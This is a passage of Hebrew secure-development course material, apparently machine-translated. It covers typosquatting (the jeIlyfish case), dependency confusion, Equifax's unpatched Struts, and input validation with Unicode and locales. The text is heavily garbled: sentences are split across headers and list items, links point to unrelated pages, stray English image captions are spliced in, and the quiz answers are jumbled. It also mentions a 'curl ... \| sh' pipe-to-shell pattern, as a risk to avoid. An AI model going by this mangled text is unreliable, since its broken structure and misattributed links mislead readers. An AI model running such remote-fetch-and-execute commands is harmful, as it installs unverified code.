![A More Secure Alternative of the JavaScript Application: In this figure some security-relevant input validation checks are run in a web browser, but all security checks are run by the web server, even if some were run in the browser earlier. Since the server in this case is trusted, this is a secure design. The database is not directly accessible by logged-in users; this is a good architecture, because direct access to the database is often unnecessary.](a_secure_design.png)

😱 שעת סיפור: הקלדה על ידי jeIlyfish ו python3-dateutil

#### ב-2019-12-01 גילה מפתח התוכנה הגרמני לוקאס מרטיני כי שתי ספריות Python במאגר PyPI הפופולרי (Python Package Index) יישמו התקפות הקלדה. חבילות זדוניות אלה היו גונבות מפתחות פרטיים SSH ו- GPG ממפתחים שהשתמשו בהם. החבילה הזדונית 

 חיקה את הלא זדוני 

####  ועשה את הנזק (שים לב שבשם החבילה הזדונית התו השלישי הוא אותיות רישיות "

", לא באותיות קטנות "*"). אותו תוקף העלה גם חבילה זדונית בשם * אשר חיקה את הפופולרי 

 ספרייה עבור Python3. החבילה הזדונית 

####  לא כללה שום קוד זדוני בעצמו, אלא במקום זאת טענה את החבילה הזדונית 

 כתלות. החבילה הזדונית * היה רק על PyPI במשך יומיים, אבל החבילה הזדונית * היה זמין כמעט שנה. שתי הספריות הוסרו על ידי PyPI ביום שבו PyPI קיבלה הודעה (

"שתי ספריות פייתון זדוניות נתפסו גונבות מפתחות SSH ו- GPG" מאת קטלין צ'ימפאנו, ZDNet, 2019

).

חידון 3.1: בחירה (הערכה) של תוכנות קוד פתוח

\>>מהן הראיות לכך שהתוכנה שאתה חושב לעשות בה שימוש חוזר תהיה כנראה בחירה טובה לאבטחה? בחר את כל התשובות הרלוונטיות. <<

#### \[!x] עדות לכך שקל להשתמש בו בצורה מאובטחת

\[x] פרויקט OSS שזכה בתג שיטות עבודה מומלצות של OpenSSF

*   \[x] פרויקט OSS עם תורמים מרובים שהיו פעילים בשנה האחרונה

*   \[ ] לתוכנה אין הצהרת רשיון

*   הורדה והתקנה של תוכנה לשימוש חוזר

*   כמובן, אם אתה מוריד ומתקין גרסה חתרנית של התוכנה בשימוש חוזר, זו יכולה להיות בעיה רצינית. אז וודאו שאתם מקבלים את 

*   נכון** גרסת התוכנה:**ודא שיש לך בדיוק את השם הנכון. התקפה נפוצה נקראת "שגיאת הקלדה". בשגיאות הקלדה, תוקף ייצור שם חבילה או שם תחום הדומים באופן מכוון וזדוני לרכיב תוכנה הנמצא בשימוש נרחב, וישתמש בשם מטעה זה כדי להפיץ גירסה זדונית של תוכנה זו. 

#### אוהם וכולם, 2020

* מצא כי *"רוב החבילות הזדוניות \[OSS] מחקות את שמות החבילות הקיימות באמצעות שגיאות הקלדה"

*   . לדוגמה:

*   בדוק אם קיימים שינויי שם מטעים נפוצים. קל לעבור בין מקף ([*-*](https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/)) וקו תחתון (

*   \_

). אחד (

#### 1

) ואותיות קטנות L (

l*) נראים דומים, וכך גם אפס (*0

) והון O (*O*). בחלק ממנהלי החבילות, אותיות רישיות וקטנות ASCII נחשבים שונים; במצבים אלה, היזהרו ממקרה. Unicode מספק תווים שנראים בדיוק כמו ASCII, אך הם אלפבית אחר, כמו קירילית או יוונית; במקרים מסוימים, אלה יכולים גם להיות מנוצלים.

בדוק עד כמה החבילה פופולרית. בדרך כלל הגרסה הפופולרית יותר היא הגרסה הנכונה. עבור חבילות, השווה את ספירות ההורדות של חבילות בעלות שם דומה. אלה עם ספירות נמוכות יותר עשויים להיות התקפות הקלדה. שקול להשתמש במנוע חיפוש כדי לזהות את החבילה או התחום הפופולריים ביותר. עם זאת, הקפד 

להתעלם* כל הדומיינים המפורסמים ממנוע חיפוש; תוקפים עשויים לשלם כדי לפרסם את הגרסה הזדונית שלהם!*בדוק את תאריך שחרור החבילה. המבוגר יותר הוא לעתים קרובות זה שרצית.*הקפד להוריד ולהתקין את התוכנה בצורה אמינה:*עליך להוריד ישירות את התוכנה מהאתר הראשי שלה או מאתר הפצה מחדש שיש לך סיבה טובה לסמוך עליו (כגון מאגר הפצת הלינוקס שלך או המאגר הסטנדרטי של מנהל חבילות שפת התכנות שלך).

בדרך כלל זה אומר שאתה צריך להשתמש 

### https:

 (TLS) כדי להוריד את התוכנה, לא 

1.  **http:**מכיוון שבדרך כלל הדבר מבטיח שאתה יוצר קשר עם האתר שביקשת ומונע מהתוקפים לשנות את התוכנה בדרך אליך.,

2.  **שקול להוריד את התוכנה, אך לאחר מכן התקן והשתמש בה רק כמה ימים לאחר מכן לאחר אימות ששום דבר לא השתנה. בדרך זו, אם אתר ההפצה הוא חתרני באופן זמני בעת הורדת התוכנה, אבל הוא תוקן במהירות, אתה לא תשתמש בגירסה חתרנית. זה לא תמיד מעשי, שכן אתה עלול להיות יותר מדי ממהר לחכות, אבל במקרים מסוימים זה קל לעשות.**נסה להימנע משימוש בצינור למעטפת (כגון  *תלתל ... | .sh*) כדי להוריד ולהתקין תוכנה. ברור שאינך יכול להוריד ולעכב את ההתקנה כאשר אתה משתמש בצינור למעטפת. בנוסף, תוקפים החותרים תחת אתר מקור יכולים לזהות בקשה מצינור למעטפת ולחתור באופן סלקטיבי תחת משתמשי pipe-to-shell (שבהגדרה אינם בודקים את מה שהם מורידים). השימוש בצינור למעטפת הופך את החתרנות באתר המקור לקשה הרבה יותר לזיהוי ולנטרול. זה גם הופך את הבנת הגרסה בפועל שהורדת והתקנת לקשה לקבוע באופן סמכותי - כך שאיבדת למעשה שליטה מסוימת בגרסה, ואינך יכול לסמוך על אחרים כדי להיות מסוגל לקבוע מה קרה. כן, התוכנית המותקנת יכולה לדווח על גירסה, אך תוכניות יכולות לדווח על כל מספר ויכולות לדווח על אותו מספר עבור גירסאות בפועל שונות. בקיצור, הסיכונים שלך גדלים אם אתה משתמש צינור למעטפת.*עם זאת, אם אתה משתמש רק בצינור למעטפת בסביבה כלולה (למשל, קונטיינר או מכונה וירטואלית עם הרשאות מוגבלות) וזורק את כל קבצי ההפעלה המיוצרים, כפי שקורה לעתים קרובות בסביבות הבדיקה של צינורות אינטגרציה רציפה (CI), צינור למעטפת הוא הרבה פחות מסוכן. צינור למעטפת הוא גם קשה להימנע במצבים מסוימים, תלוי איך התוכנה בשימוש חוזר מופץ, ולפעמים זה לא שווה לנסות להימנע צינור אל מעטפת. אז זה טיפ ששווה לקחת בחשבון, אבל לא תמיד שווה לעשות. *נזכר

3.  **התמקדו בניהול סיכונים, ולא בהימנעות מוחלטת מסיכונים.:**כאשר הדבר חשוב ופרקטי, נסו לוודא שהחבילה חתומה דיגיטלית על ידי יוצריה הצפויים (או לפחות המפיצים מחדש שלה). תוכנה לאימות חתימה דיגיטלית של חבילה, הנקראת גם חתומה באופן קריפטוגרפי, קיימת כבר עשרות שנים. במצבים מסוימים, יש אימות אוטומטי שהחבילה אכן מגיעה ממפיץ מחדש. עם זאת, לעתים קרובות קשה יותר לוודא שיש לך את המפתחות הציבוריים המתאימים הנכונים (זוהי דוגמה ל *ניהול מפתחות* בעיה.) יש עבודה מתמשכת בתחום זה, למשל, [סיגסטור](https://cwe.mitre.org/data/definitions/276.html) Project פועלת כדי להקל באופן משמעותי על חתימה דיגיטלית ואימות של ממצאי תוכנה.  כאשר באפשרותך ליצור ולאמת חתימות דיגיטליות, נצל אותן.

4.  **היזהר מלהיות תלוי ביכולת להוריד ולהתקין רכיבים בזמן ריצה ממיקומים אחרים (חיצוניים). זהו נוהג נפוץ עבור יישומי אינטרנט רבים, במיוחד עבור הרכיבים בצד הלקוח שלהם כגון רכיבי JavaScript ו- webfonts. עם זאת, הסיכון הוא שאם מיקום זה הופך ללא זמין (עקב התקפה או פשוט משום שהספק מחליט להפסיק לתמוך בו), המערכת שלך תהפוך ללא זמינה. הספק עשוי להיות ארגון גדול, אך הוא עדיין עשוי לבחור להפסיק לתמוך במה שאתה תלוי בו. לפני שתסתמך על משהו בזמן ריצה שאינך חייב, לפחות חקור כדי לקבוע את המהימנות העתידית של שירות זה, והשתמש בשירות אמין כגון רשת הפצת תוכן ידועה (CDN).**כמו כן, עליך לוודא שהמערכת שלך אינה פגיעה להתקפת "בלבול תלות" המכונה "החלפה". פגיעות זו משפיעה על מערכות המזהות רשימה של יחסי תלות ומוגדרות לאחזר יחסי תלות אלה מיותר ממאגר אחד. מערכות כאלה מוגדרות לעתים קרובות להיות תלויות בחבילה P כלשהי שבה המפתחים הניחו שחבילה P תאוחזר ממאגר מסוים אחד (בדרך כלל מאגר פרטי). הפגיעות מתרחשת אם כלום 

5.  **דורש** שהחבילה P תאוחזר מהמאגר הצפוי שלה. אם שום דבר לא דורש זאת, תוקף יכול ליצור חבילה זדונית P עם אותו שם על 

6.  **שונה** מאגר (בדרך כלל מאגר ציבורי), והטעי את המערכת להשתמש בחבילה זדונית זו במקום זאת. תוקפים יכולים לנקוט צעדים רבים כדי להפוך את השימוש בו לסביר, כגון מתן מספר גרסה גדול לגרסה הזדונית שלהם. זו אינה התקפה תיאורטית; התוקפים החלו לנצל פגיעות זו באופן נרחב בשנת 2021. (לקבלת מידע נוסף, ראה "

## 3 דרכים להפחתת סיכונים בעת שימוש בחבילות פרטיות

" על ידי מיקרוסופט ו "

בלבול תלות: איך פרצתי לאפל, מיקרוסופט ועשרות חברות אחרות

" מאת אלכס בירסן.) ישנם אמצעי נגד שונים לבלבול תלות, למשל:

השתמש בהזנה יחידה (לדוגמה, מאגר יחיד או רישום יחיד). אם יש מקור אחד, אין הזדמנות לבלבול.

להצהיר בבירור, עבור כל חבילה, מאיפה יש לאחזר את החבילה. אלה נקראים לעתים "טווחים מבוקרים".

תעדף הזנות כך שתמיד יתייעצו תחילה עם ההזנות המהימנות ביותר, ולאחר מכן הזנות פחות מהימנות יתייעצו רק כאשר ההזנות המהימנות יותר מדווחות במפורש שהחבילה לא נמצאה. ודא שההזנות הפחות מהימנות לעולם לא יעקפו את ההזנות המהימנות יותר.

השתמש בתכונות אימות בצד הלקוח. גישה אחת היא לאכוף הצמדת תלות המכונה הצמדת גרסה, כלומר, דרישה להשתמש בגרסה ידועה ספציפית. ניתן לאכוף זאת על ידי דרישת ערך גיבוב קריפטוגרפי ספציפי (המכונה "טביעת אצבע דיגיטלית") של חבילה. גישה נוספת היא אימות תקינות כדי לוודא שחבילה שהורדת זהה לפעם הראשונה שהורדה.

### 🔔 בלבול תלות הוא מקרה מיוחד של 2021 CWE Top 25 #34, 

רכיב נתיב חיפוש לא מבוקר

####  (

CWE-427*). הסתמכות על תוספים, ספריות או מודולים ממקורות לא מהימנים, והסתמכות על רשתות אספקת תוכן לא אמינות, נחשבת לחלק מ-2021 OWASP Top 10 #8 (A08:2021), *כשלים בתקינות תוכנה ונתונים

<img src="openai/racecars.png" width="512" height="512" alt="A blue racecar and a red racecar racing to the finish line in front of a futuristic city"><br>.*חידון 3.2: הורדה והתקנה של תוכנה לשימוש חוזר*>>מהן הדרכים הטובות לרכוש תוכנה? בחר את כל התשובות הרלוונטיות. <<[\[!x\] בדקו שוב שהשם שתבקשו הוא באמת השם שרציתם (למשל, ](https://openai.com/dall-e-2/)

\-* ו *&95;* אינם מוחלפים, *O

 ו *0* אינם מוחלפים, וכן הלאה)

1.  \[x] שימוש 

2.  https:**לא **http:**\[x] שקול להוריד את התוכנה, אך לאחר מכן להתקין אותה רק כמה ימים לאחר מכן לאחר אימות שאין בעיות שדווחו באתר זה**עדכון תוכנה שנעשה בה שימוש חוזר**עדכון רכיבי תוכנה שנעשה בהם שימוש חוזר**בפועל, יהיו לך רכיבי תוכנה רבים בשימוש חוזר, והם יצטרכו להיות מעודכנים מדי פעם. לפעמים תימצא פגיעות באחת, ובמקרה זה עליך לקבל הודעה במהירות ולהיות מוכן לעדכן במהירות. כתוצאה מכך, עליך לנהל רכיבים שנעשה בהם שימוש חוזר:**השתמש במנהלי חבילות, במערכות בקרת גרסאות (כגון git), בכלי בנייה ובבדיקות אוטומטיות כדי שתוכל לקבוע בקלות אילו גירסאות בדיוק יש לך מכל רכיב שנעשה בו שימוש חוזר ותוכל לעדכן במהירות כל אחת מהן.**תלוי רק ב 

3.  מתועד* ממשקים והתנהגות, ולהימנע ממשקים מיושנים, כדי למקסם את הסבירות ליכולת לעדכן תוכנות בשימוש חוזר בעת הצורך.*מצפה** שאתה תעדכן את התוכנה שבה אתה משתמש, כולל הפלטפורמה הבסיסית שלך. זה טיפשי להניח שלעולם לא יהיה צורך לעדכן את התוכנה במהירות.**אל תשנה את OSS ותיצור "מזלג מקומי" משלך. אם תיתוקן פגיעות בגירסה מאוחרת יותר של אותה מערכת הפעלה, יהיה קשה יותר ויותר לשלב תיקון זה. במקום זאת, אם עליך לשנות חלק ממערכות ההפעלה כך שיתאימו לצרכים שלך, עבוד עם פרויקט OSS המקורי במעלה הזרם כדי לשלב את השיפורים שלך בגרסה הרשמית. לאחר מכן, גירסאות חדשות יותר של אותה מערכת הפעלה, כולל אלה שמתקנות פגיעויות, יכללו גם את היכולות הדרושות לך.**שמור על עדכניות יחסית של התוכנה שנעשה בה שימוש חוזר. אם הרכיבים שנעשה בהם שימוש חוזר מרחיקים לכת מאוד, ייתכן שיהיה קשה מאוד להחליף גרסה פגיעה בגרסה קבועה.**נטר כדי לקבוע אם באחת מגרסאות התוכנה שבהן אתה משתמש התגלתה פגיעות הידועה לציבור. נדון בכך בהמשך הפרק על ניתוח הרכב תוכנה (SCA).**😱 שעת סיפור: אקוויפקס**התוכנית הנפוצה Apache Struts היה פגיעות קריטית כי היה קבוע ב 2017-03-06 ודווח באופן נרחב על ידי עיתונות המחשב. מתווך הנתונים Equifax קיבל הודעה מ-Apache, מה-CERT האמריקאי ומהמחלקה לביטחון המולדת של ארה"ב על הפגיעות, וקיבל הוראות כיצד לבצע את התיקון. עם זאת, Equifax נכשלה ביישום עדכון בזמן. **"חודשיים לאחר מכן, Equifax עדיין לא הצליחה לתקן את המערכות שלה. בסופו של דבר זה הגיע אליו ב-29 ביולי. התוקפים ניצלו את הפרצה כדי לגשת למאגרי המידע של החברה ולגנוב מידע צרכני ב-13 במאי, יותר מחודשיים לאחר ש-Equifax הייתה צריכה לתקן את הפגיעות". Equifax דיווחה כי "145.5 מיליון לקוחות בארה"ב, כ-44% מאוכלוסיית \[ארה"ב], הושפעו מהפרצה... התוקפים קיבלו גישה ל ... בדיוק סוג המידע שעבריינים יכולים להשתמש בו כדי להתחזות לקורבנות לבנקים, חברות כרטיסי אשראי, חברות ביטוח, חברות סלולר ועסקים אחרים הפגיעים להונאות. כתוצאה מכך, כל 143 מיליון הקורבנות בארה"ב נמצאים בסיכון גבוה יותר לגניבת זהות, ויישארו בסיכון במשך שנים רבות. ואלה שסובלים מגניבת זהות יתקשו במשך חודשים, אם לא שנים, כשהם פועלים לנקות את שמם ואת דירוג האשראי שלהם".** (ברוס שנייר, 

אני על הפריצה של Equifax: עדות והצהרה לתיעוד של ברוס שנייר

,  2017)

עדכון אופן השימוש בתוכנה שנעשה בה שימוש חוזר (הימנעות/החלפה של ממשקים מיושנים)*אתה לא רק צריך לעדכן רכיבים שבהם אתה משתמש, אלא גם איך אתה משתמש בהם.*כאשר רכיבים מתעדכנים, הם לפעמים מחליפים את הממשק שלהם בממשק חדש/משופר על פני ממשק מיושן/לא בשימוש. כאשר הדבר מעשי, עליך להימנע או להחליף שימושים כלשהם בממשקים המיושנים/שהוצאו משימוש של רכיבים אחרים. לפעמים הממשק מיושן בגלל פגיעות אבטחה. בנוסף, ממשקים מיושנים אלה נשמטים בדרך כלל עם הזמן, כך שאם אתה משתמש בממשק המיושן, ייתכן שלא ניתן יהיה לעדכן במהירות אם תימצא פגיעות מאוחר יותר.[אם אתה מיושן ממשק המשמש אחרים, עשה כמיטב יכולתך כדי לספק תקופת מעבר ארוכה שבה גם הממשקים הישנים וגם החדשים זמינים. פרויקטים מסוימים לא יוכלו לעבור בקלות, וזה יכול לפעמים לקחת זמן. ניסיון לכפות עדכון מהיר לעתים קרובות גורם לתגובות חוזרות וגורמות למשתמשים ](https://cwe.mitre.org/data/definitions/362.html)דחה* העדכונים או העיכובים בשימוש בהם, שעלולים להוביל לבעיות אבטחה ארוכות טווח.*שימוש חוזר בתוכנה: סיכום[אלה הם רק טיפים, והם בשום אופן לא ממצים. זה נהדר שיש לנו כל כך הרבה תוכנות נהדרות לשימוש חוזר; פיתוח תוכנה מודרני יהיה בלתי אפשרי בלעדיהם. עם זאת, יש כמה מלכודות אבטחה פוטנציאליות בתוכנות שנעשה בהן שימוש חוזר. שיטות העבודה שדיברנו עליהן בפרק זה יעזרו לך להימנע מבעיות אבטחה רבות עקב תוכנות שנעשה בהן שימוש חוזר.](https://cwe.mitre.org/data/definitions/377.html)חידון 3.3: עדכון תוכנה בשימוש חוזר

#### >>תוכנה בשימוש חוזר היא כל כך מסוכנת, שתמיד תעדיף לשכתב את התוכנה בעצמך כשאתה יכול. אמת או שקר? <<

( ) נכון*(x) לא נכון*\[הסבר]

זה לא נכון. בטח, ישנם סיכונים בעת שימוש חוזר בתוכנה, אבל יש סיכונים בכתיבת תוכנה בעצמך. סביר להניח שגם אתם תעשו טעויות, ואלה שכתבו את התוכנה לשימוש חוזר השקיעו לא פעם שנים בפיתוח מומחיות בתחום הספציפי הזה. במקום לנסות לשכתב הכל - מה שיהיה לא מעשי מבחינה כלכלית - עליך לגשת לשימוש חוזר בתוכנה כבעיה של ניהול סיכונים. עליכם לבחון את הבחירות שלכם, כולל שימוש בטיפים כאן, כדי לקבל החלטות מנומקות.

#### \[הסבר]

חלק א': בחינת גמר

*   לא כלול כחלק מהגרסה החינמית של הקורס.

*   חלק ב': יישום*יסודות היישום*סקירה כללית של היישום

*   ייתכן שאתה יודע מה התוכנה שלך אמורה לעשות (דרישות) וייתכן שיש לך דרך לחלק את הבעיה (עיצוב). אבל אם היישום שלך הוא רע, התוכנה היא רעה!**סעיף זה דן כיצד ליישם תוכנה מאובטחת. נעשה זאת על ידי בחינת תצוגה מופשטת מאוד של תוכנית, כפי שממחישה האיור הבא:**תצוגה מופשטת של תוכנית**כמעט לכל התוכניות יש תשומות (שעליך לאמת), לעבד נתונים, לקרוא מדי פעם לתוכניות אחרות, ובסופו של דבר להפיק פלט(ים). קריאה לתוכנית אחרת יוצרת (למעשה) תשומות לאותן תוכניות אחרות, ותפוקות מאותן תוכניות אחרות. סעיפי המשנה הבאים ידונו בכל אחד מהתחומים הללו בתורו. לאחר מכן נדון בכמה נושאים מיוחדים.**כמובן, רק אומר 

*   "כתוב קוד מאובטח"

####  או 

"אל תעשה טעויות"** אינו מועיל. החדשות הטובות הן שכמעט כל השגיאות שגורמות לפגיעויות כיום ניתנות לקיבוץ למספר קטן יחסית של קטגוריות, וחלק מהקטגוריות הללו נפוצות במיוחד. אז כפי שצוין קודם לכן, אנו יכולים לחסל את הרוב המכריע של פגיעויות אבטחה פשוט על ידי למידה על קטגוריות אלה, לדעת איך לחפש אותם, ולהפחית אותם. נזכיר שוב ושוב את רשימת 10 המובילים של OWASP (עבור יישומי אינטרנט) ואת רשימת 25 המובילים של CWE (עבור יישומים באופן כללי), מכיוון שהם מספקים דרך שימושית לזהות את הדברים החשובים ביותר.**כמה מהסוגים הנפוצים של פגיעויות הם בעיות תכנון. עם זאת, רוב השאר הם בעיות יישום. כאשר נעבור על המודל שלנו של תוכנית, נדון בסוגים הרלוונטיים של פגיעויות, כולל כיצד לזהות אותן ולנטרל אותן. לאחר שתתחיל ליישם מידע זה, תגלה כי פגיעויות רבות נעלמות מהתוכנית שלך.**כמעט כל התוכניות צריכות לקבל קלט. אז נתחיל לבחון כיצד להטמיע תוכנה מאובטחת על ידי דיון כיצד לטפל באופן מאובטח בתשומות.**אימות קלט**פרק זה מתאר כיצד לאמת קלט, כולל כיצד לאמת מספרים וטקסט, את החשיבות של מזעור משטחי תקיפה וכיצד לשפר את הזמינות על-ידי התחשבות בקלטים.**מטרות הלמידה:

#### דונו ביסודות של אימות קלט.

להבין כיצד לאמת מספרים.

בדוק בעיות מרכזיות בטקסט, כולל Unicode ואזורים.*הסבר כיצד להשתמש בביטויים רגולריים כדי לאמת קלט טקסט.*להבין את החשיבות של מזעור משטחי התקיפה.

דונו בברירות מחדל מאובטחות ובאתחול מאובטח.

#### שפר את הזמינות על-ידי התחשבות בתשומות.

יסודות אימות קלט

מבוא ליסודות אימות קלט

חלק מהכניסות מגיעות ממשתמשים לא מהימנים, ויש לאמת קלטים אלה (לפחות) לפני השימוש בהם. אם תמנע מנתונים לא חוקיים להיכנס לתוכנית שלך, יהיה הרבה יותר קשה לתוקפים לנצל את התוכנה שלך. אימות קלט יכול גם למנוע באגים רבים ולהפוך את התוכנית שלך לפשוטה יותר. אחרי הכל, אם התוכנית שלך יכולה לדחות מיד כמה נתונים פגומים, אתה לא צריך לכתוב את הקוד כדי להתמודד עם מקרים מיוחדים אלה מאוחר יותר. זה חוסך זמן, וקוד כזה במקרה מיוחד סביר יותר שיהיו שגיאות עדינות.*even* למודגשים, 

\<a>* עבור היפר-קישורים) ותכונות (לדוגמה, *הריף

 תכונה של 

# \<a>

 כדי שתוכל לומר לאן לקשר, ואולי 

מזהה

1.   תכונה כך שאחרים יוכלו להתייחס לנקודה מסוימת). לאחר מכן, כאשר תוקף מנסה לספק HTML עם תגים אחרים (לדוגמה, זדוני 

2.  \<script>

3.  ), המאמת פשוט לא יקבל את זה בכלל.

4.  תבניות קלט מסוימות הן מבנים מורכבים של הרבה נתונים אחרים. לדוגמה, קבצי JSON, XML ו- CSV יכולים להכיל נתונים רבים אחרים. בדרך כלל תשתמש בספריה אמינה כדי לבחון ולחלץ את חלקי הנתונים הדרושים לך, ולאחר מכן תאמת כל פריט. אז שוב, אם אתה מחלץ רצף של תווים המייצגים מספר, היית מאמת את המספר (למשל, כדי לראות אם הוא נמצא בטווח המינימלי והמקסימלי). במקרים רבים, זהו ערך טקסט. בהמשך נדון בטיפול במבנים מרוכבים, אך בשלב מסוים הם יתפרקו לערכים ספציפיים, לעתים קרובות כמספרים או כטקסט.

5.  תוכניות רבות צריכות לאמת שדות טקסט, אך הכללים של שדות אלה אינם מוגדרים בספריה קיימת. חלק מהכלים מאפשרים לנו להתמודד איתם בקלות, אבל כדי להשתמש בהם, אנחנו צריכים להבין קצת רקע. תחילה נצטרך לדון יותר על טקסט, unicode ואזורים באופן כללי. לאחר מכן נדון באימות טקסט באופן כללי ובדרך המקובלת לעשות זאת - ביטויים רגולריים.

## חידון 1.2: אימות קלט: כמה סוגי נתונים פשוטים

### >>בחר את כל שיטות העבודה המומלצות לאימות מספר קלט ממקור לא מהימן: <<

\[!x] בדוק כי הוא לפחות גדול כמו המינימום.

![Dependency](dependency.png)

*\[x] בדוק שהוא לכל היותר גדול כמו המקסימום.*\[x] השתמש בסוג לא חתום אם השפה שלך תומכת בו והקלט אינו מורשה להיות שלילי.[\[x\] דרוש שהמספר יהיה מספר שלם אם זהו סוג המספר הצפוי היחיד.](https://xkcd.com/2347/)Sidequest: טקסט, Unicode ואזורים[\[\[אופציונלי\]\]](https://creativecommons.org/licenses/by-nc/2.5/)לעתים קרובות אתה מקבל טקסט כקלט (ישירות או כחלק ממבנה גדול יותר). נתאר את הטקסט כרצף של תווים. אם קלט הטקסט אינו מהימן, עליך לאמת טקסט זה. כדי להבין זאת, עלינו להבין איזה טקסט 

הוא

. מספר גדול להפליא של מפתחים מעולם לא למדו הרבה על טקסט - למרות שזה אחד מסוגי הנתונים הנפוצים ביותר - אז בואו נוודא שאתה מבין את זה קודם. אם אתה כבר בטוח שאתה מכיר בעיות טקסט כגון Unicode, קידוד ואזורים, אל תהסס לדלג הלאה.

נקודות קוד וקידוד***מחשבים דיגיטליים אינם מטפלים ישירות בתווים; במקום זאת עלינו להקצות מספר לכל תו. ערכות תווים שונות עם משימות שונות נוצרו עבור שפות שונות, וזה יצר סיוטים של יכולת פעולה הדדית. ברוב המכריע של המקרים כיום תשתמש בהקצאות התווים שצוינו על-ידי Unicode ו- ISO/IEC 10646, המגדירות ערכת תווים אוניברסלית (UCS) המקצה מספר ייחודי (***נקודת קוד[*) לכל דמות. לדוגמה, הם מקצים לתו הלטיני "A" את המספר העשרוני 65.*](https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/)מבחינה היסטורית, חשבו ש-16 סיביות יספיקו כדי לזהות את כל התווים, אבל זה היה שגוי ושונה ב-1996 (כיום הם משתמשים ב-21 סיביות כדי לקודד כל תו). כתוצאה מטעות זו, לשפות תכנות מסוימות יש סוג "תו" (למשל, של Java 

תו

) שאורכו 16 סיביות בלבד. סוג נתונים של 16 סיביות אינו יכול, כשלעצמו, לאחסן כל תו שרירותי של 21 סיביות, כך שבשפות תכנות וממשקי API עם "תו" של 16 סיביות, "תו" הוא לפעמים רק חצי תו בפועל.

### יש להחליף טקסט המשתמש במשימות אלה באמצעות 

קידוד

. ישנם חמישה קידודים סטנדרטיים עבור יוניקוד: UTF-32 (ביג-אנדיאן וקטן-אנדיאן), UTF-16 (ביג-אנדיאן וקטן-אנדיאן) ו-UTF-8. באופן כללי, עליך להשתמש ב- UTF-8 אלא אם כן יש לך סיבה לעשות אחרת. ל-UTF-16 ול-UTF-32 יש שתי צורות: "אנדיאן קטן" ו"אנדיאן גדול". אם אינך יודע אם הנמען מצפה לביג-אנדיאן או לאנדיאן קטן, עליך להוסיף [*סמן סדר בתים*](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme) בתחילת הטקסט כדי לוודא שהמקלט מפרש אותו כראוי, וכאשר מקבלים UTF-16 או UTF-32, היישום שלך צריך לשים לב לכך. בעיה קריטית היא שחלק מרצפי הבתים הם 

לא

1.  ** חוקי, כך שכאשר אנו מבצעים אימות קלט, נצטרך לוודא שהנתונים שאנו מקבלים תקפים לקידוד שאנו מצפים לו.**אזורי

2.  **פירוש הדמויות מסובך יותר ממה שאתם חושבים. הרבה תלוי ב"אזור", המגדיר את שפת המשתמש, מדינה/אזור, העדפות ממשק משתמש וכנראה גם קידוד תווים. לדוגמה, במערכות יוניקס/לינוקס, אנגלית אוסטרלית עם קידוד UTF-8 מיוצגת כאזור **en_AU. UTF-8
    1.  . אזור חשוב, מכיוון שהוא משפיע על האופן שבו הדמויות מתפרשות. לדוגמה, זה משפיע על:
    2.  סדר איסוף (מיון)
    3.  סיווג תווים (מהי "אות"?). טווחים כמו "A-Za-z" אינם מפרטים 
    4.  כל התווים האלפביתיים

3.  ** באזורים שרירותיים. אם אתה משתמש באזור C או POSIX ומעבד רק תווי ASCII, טווח זה הוא הרשימה המלאה של תווים אלפביתיים, אך הדבר אינו נכון באופן כללי.**המרת רישיות (מהי אותיות גדולות/קטנות של תו, אם היא קיימת?). שים לב שגם אם יש המרה, ייתכן שהיא לא תומר לתו בודד באזור נתון.
    1.  אם ברצונך לפרש טקסט באותו אופן ללא קשר לאזור, הפתרון הרגיל הוא להשתמש באזור "C" aka "POSIX" - עם זאת, היזהר, כי זה לא תמיד מה שהמשתמש רצה.
    2.  המרת מקרה טעונה במיוחד. בשפות מסוימות אין אותיות גדולות וקטנות. גם אם כן, המיפוי ביניהם שונה בין אזורים שונים. כך שהגרסה הרישית של אות היא 
    3.  לא
    4.   קבוע - הוא מבוסס על האזור!
    5.  דוגמה מצוינת לכך הן השפות הטורקיות המשתמשות באלפבית הטורקי. באלפבית זה אותיות "I" מנוקדות וחסרות נקודות הן אותיות נפרדות עם צורות אותיות גדולות וקטנות. לדוגמה, אותיות קטנות מנוקדות "i" כאשר הן רישיות הופכות לאותיות רישיות מנוקדות "İ" (לא אותיות רישיות ללא נקודה "I" כפי שקורה באזור אנגלי), ואותיות רישיות ללא נקודה "I" כאשר אותיות קטנות הופכות לאותיות קטנות ללא נקודה "ı". שים לב כי "i" ו- "I" הם 

4.  **לא**
    1.   שווה בהתאמה חסרת רגישות לרישיות במערכת המיושמת כראוי עבור אזורים כאלה. זה הביא למספר נקודות תורפה באבטחה, ומדי פעם נזכיר זאת בקורס מכיוון שזו דוגמה מצוינת לסוגי הטעויות שיכולות לקרות אם אינך מודע לכך.[אם אתה רוצה לדעת אם "שני רצפים של תווים שקולים" התעלמות מקרה, אז במקרה הכללי אתה צריך לקרוא שגרה לעשות את זה ](https://bestpractices.coreinfrastructure.org/)ו
    2.   לספק לו את האזור שבו יש להשתמש. זה מעלה את הסוגיות על שקילות באופן כללי, אשר נדון בהמשך.[שקילות יוניקוד](https://deps.dev/)מתכנתים רבים מניחים שאם רצף של טקסט "נקודות קוד" שונות, הן מחרוזות שונות. אמנם זה בסדר למטרות מסוימות, אבל זה המודל המנטלי הלא נכון עבור אחרים, גם אם אתה מניח שאתה רוצה התאמה "תלוית מקרה". Unicode היה צריך להיות מפותח באופן שהיה תואם את התקנים הקיימים, וזה הוביל כמה סיבוכים.[במקרים מסוימים עליך להשתמש בשגרות ספריה כדי לבדוק שקילות קנונית של Unicode. הסיבה לכך היא שיש כמה נקודות קוד, או רצפים של נקודות קוד, שבנסיבות רבות יש לשקול ](https://github.com/ossf/scorecard)שווה ערך
    3.   במובן זה שהם צריכים תמיד להיראות זהים, גם אם יש להם ערכים בסיסיים שונים. לדוגמה, נקודת הקוד U+006E (האותיות הקטנות הלטיניות "n") ואחריה U+0303 (הטילדה המשלבת "◌̃") שקולה באופן קנוני לנקודת קוד U+00F1 ("ñ").  דוגמה נוספת היא התו "Å" שניתן לייצגו כ- U+00C5 (האות "אות גדולה לטינית A עם טבעת מעל") או כ- U+212B ("סימן אנגסטרום"): שני ערכים אלה צריכים להיחשב שקולים.
